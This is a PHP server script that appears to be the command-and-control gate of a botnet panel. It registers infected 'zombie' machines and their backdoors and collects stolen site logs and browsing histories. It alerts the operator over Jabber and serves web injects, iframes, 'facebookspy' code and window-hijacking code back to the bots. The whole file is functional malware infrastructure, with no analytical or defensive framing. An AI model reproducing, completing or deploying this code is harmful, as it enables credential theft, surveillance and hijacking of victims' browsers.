<?php
require_once('includes/config.php');
require('class/inject.class.php');
if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '' && isset($_GET['zname']) && $_GET['zname'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $z_name = $_GET['zname'];

    
    $insert = $bdd->prepare("INSERT INTO logs_checker(url_site,logs_site,zombie) VALUES(:url_site, :logs_site, :zombie)");
    $insert->bindParam(':url_site', $url_check);
    $insert->bindParam(':logs_site', $info);
    $insert->bindParam(':zombie', $z_name);
    $insert->execute();
    
    
    $select = $bdd->prepare('SELECT * FROM bots WHERE name = :name');
    $select->bindParam(':name', $z_name);
    $select->execute();
    $result = $select->fetch();
    if($result['name'] != ''){
        $update = $bdd->prepare("UPDATE bots SET numbers_logs = numbers_logs + 1 WHERE name = :name");
        $update->bindParam(':name', $z_name);
        $update->execute();
    }
    $select_jabber = $bdd->prepare("SELECT * FROM settings");
    $select_jabber->execute();
    $fetch_jabber = $select_jabber->fetch();
    if($fetch_jabber['jabber_username'] != ''){
        $message = "News logs from ".$url_check;
        SendJabber($fetch_jabber['jabber_username'], $fetch_jabber['jabber_password'], $fetch_jabber['jabber_to'], $message);
    }
}
elseif(isset($_GET['iframe']) && $_GET['iframe'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
    $zombie = $_GET['zombie'];
    $object = "iframe";

    $select = $bdd->prepare("SELECT * FROM bot_settings WHERE setting_name = :setting_name AND bot_id = :bot_id AND available = '1'");
    $select->bindParam(':setting_name', $object);
    $select->bindParam(':bot_id', $zombie);
    $select->execute();
    $result = $select->fetch();
    if($result['setting_value'] != ''){
        echo trim($result['setting_value']);
        return true;
    }
    return false;
}
elseif(isset($_GET['history']) && $_GET['history'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
    $history = $_GET['history'];
    $zombie = $_GET['zombie'];
    $time = date('d-m-Y');
    
    
    $select = $bdd->prepare("SELECT * FROM history_web WHERE website = :website AND zombie = :zombie");
    $select->bindParam(':website', $history);
    $select->bindParam(':zombie', $zombie);
    $select->execute();
    $result = $select->fetch();
    if($result['website'] != ''){
        exit(1);
    }
    
    $insert = $bdd->prepare("INSERT INTO history_web(website, zombie, timevisit) VALUES(:website, :zombie, :time)");
    $insert->bindParam(':website', $history);
    $insert->bindParam(':zombie', $zombie);
    $insert->bindParam(':time', $time);
    $insert->execute();
}
elseif(isset($_GET['last']) && $_GET['last'] != '')
{
    $select_last = $bdd->prepare("SELECT * FROM logs_checker WHERE last = '0' ORDER BY id DESC LIMIT 0,1");
    $select_last->execute();
    
    $fetch = $select_last->fetch();
    if($fetch['id'] != '')
    {
        $end = "Url : ".$fetch['url_site']."\nLogs : ".$fetch['logs_site'];

        $update = $bdd->prepare("UPDATE logs_checker SET last = '1' WHERE id = :id");
        $id = $fetch['id'];
        $update->bindParam(':id', $id);
        $update->execute();
        echo $end;
    }
}
elseif(isset($_GET['add']) && $_GET['add'] != '' && isset($_GET['version']) && $_GET['version'] != '')
{
    $zombie_name = $_GET['add'];
    $backdoor_name = $_GET['version'];
    $check = $bdd->prepare("SELECT * FROM bots WHERE name =:name");
    $check->bindParam(':name', $zombie_name);
    $check->execute();
    $result = $check->fetch();
    if($result['name'] == ''){
        $insert = $bdd->prepare("INSERT INTO bots(name,backdoor_name) VALUES(:name, :backdoor_name)");
        $insert->bindParam(':name', $zombie_name);
        $insert->bindParam(':backdoor_name', $backdoor_name);
        $insert->execute();
    }
}
elseif(isset($_GET['online']) && $_GET['online'] != ''){
    $zombie = $_GET['online'];
    $online = $bdd->prepare("UPDATE bots SET online = '1' WHERE name = :name");
    $online->bindParam(':name', $zombie);
    $online->execute();
}
elseif(isset($_GET['webinject']) && $_GET['webinject'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
    WebInject::show_inject($_GET['webinject']);
}
elseif(isset($_GET['source_spy']) && $_GET['source_spy'] != ''){
    $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :id");
    $select->bindParam(':id', $_GET['source_spy']);
    $select->execute();
    if($select->rowCount() > 0){
        $fetch = $select->fetch();
        if($fetch['source_code'] != ''){
            echo base64_decode($fetch['source_code']);
        }
    }
}
elseif(isset($_POST['add_source_spy']) && $_POST['add_source_spy'] != '' && isset($_POST['z_name']) && $_POST['z_name'] != ''){
    $select_id = $bdd->prepare("SELECT id FROM bots WHERE name = :name");
    $select_id->bindParam(':name', $_POST['z_name']);
    $select_id->execute();
    if($select_id->rowCount() > 0){
        $fetch = $select_id->fetch();
        $ids = $fetch['id'];
        $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :id");
        $select->bindParam(':id', $ids);
        $select->execute();
        $date_last = date('d-m-Y');
        if($select->rowCount() > 0){
            $update = $bdd->prepare("UPDATE facebookspy SET source_code = :source_code,date_last = :date_last WHERE bot_id = :bot_id");
            $update->bindParam(':source_code', $_POST['add_source_spy']);
            $update->bindParam(':bot_id', $ids);
            $update->bindParam(':date_last', $date_last);
            $update->execute();
        }
        else{
            $insert = $bdd->prepare("INSERT INTO facebookspy(bot_id,source_code,date_last) VALUES(:bot_id, :source_code,:date_last)");
            $insert->bindParam(':bot_id', $ids);
            $insert->bindParam(':source_code', $_POST['add_source_spy']);
            $insert->bindParam(':date_last', $date_last);
            $insert->execute();
        }
    }
}
elseif(isset($_POST['source']) && $_POST['source'] != '' && isset($_POST['z_name']) && $_POST['z_name'] != ''){

    $select_id = $bdd->prepare("SELECT id FROM bots WHERE name = :name");
    $select_id->bindParam(':name', $_POST['z_name']);
    $select_id->execute();
    if($select_id->rowCount() > 0){
        $ids = $select_id->fetch()['id'];
        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
        $select->bindParam(':bot_id', $ids);
        $select->execute();
        if($select->rowCount() < 1){
            $insert = $bdd->prepare("INSERT INTO hijacking_window(bot_id,windows_code) VALUES(:bot_id, :source)");
            $insert->bindParam(':bot_id', $ids);
            $insert->bindParam(':source', $_POST['source']);
            $insert->execute();
        }
        else{
            $update = $bdd->prepare("UPDATE hijacking_window SET windows_code = :source WHERE bot_id = :bot_id");
            $update->bindParam(':source', $_POST['source']);
            $update->bindParam(':bot_id', $ids);
            $update->execute();
        }
    }
}
elseif(isset($_GET['hijack_source']) && $_GET['hijack_source'] != '' && isset($_GET['id']) && $_GET['id'] != '')
{
        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
        $select->bindParam(':bot_id', $_GET['id']);
        $select->execute();
        if($select->rowCount() > 0){
            $fetch = $select->fetch();
            echo $fetch['windows_code'];
        }
}
?>